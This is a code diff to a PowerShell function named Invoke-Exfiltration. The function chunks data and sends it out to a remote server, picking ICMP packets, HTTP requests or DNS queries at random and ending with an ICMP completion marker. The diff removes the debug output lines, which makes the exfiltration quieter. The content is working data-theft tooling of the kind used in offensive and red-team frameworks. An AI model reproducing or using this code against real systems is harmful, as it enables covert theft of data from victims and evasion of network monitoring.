@@ -67,21 +67,17 @@ function Invoke-Exfiltration {
             
             $str = $string.Substring($i * $Split, $Split);
             $sender = Get-Random -minimum 1 -maximum 4;
-            write-host $sender 
         
         If ($sender -eq '1') {
             $data = $jobid + '|!|' + $i + '|!|' + 'I' + '|!|' + $str
-            write-host $data
             $q = Send-ICMPPacket $data
             }
         If ($sender -eq '2') {
             $data = $jobid + '|!|' + $i + '|!|' + 'H' + '|!|' + $str
-            write-host $data
             $q = Send-HTTPRequest $data $IE
             }
         If ($sender -eq '3') {
             $data = $jobid + '|!|' + $i + '|!|' + 'D' + '|!|' + $str
-            write-host $data
             $q = Send-DNSRequest $server $data $jobid
             }
 
@@ -94,12 +90,10 @@ function Invoke-Exfiltration {
 
         If ($sender -eq '1') {
             $data = $jobid + '|!|' + $i + '|!|' + 'I' + '|!|' + $str
-            write-host $data
             $q = Send-ICMPPacket $data
             }
         If ($sender -eq '2') {
             $data = $jobid + '|!|' + $i + '|!|' + 'H' + '|!|' + $str
-            write-host $data
             $q = Send-HTTPRequest $data $IE
             }
 
@@ -107,7 +101,6 @@ function Invoke-Exfiltration {
     
         $i = $i + 1
         $data = $jobid + '|!|' + $i + '|!|DONE'
-        write-host $data
         $q = Send-ICMPPacket $data
         };
 
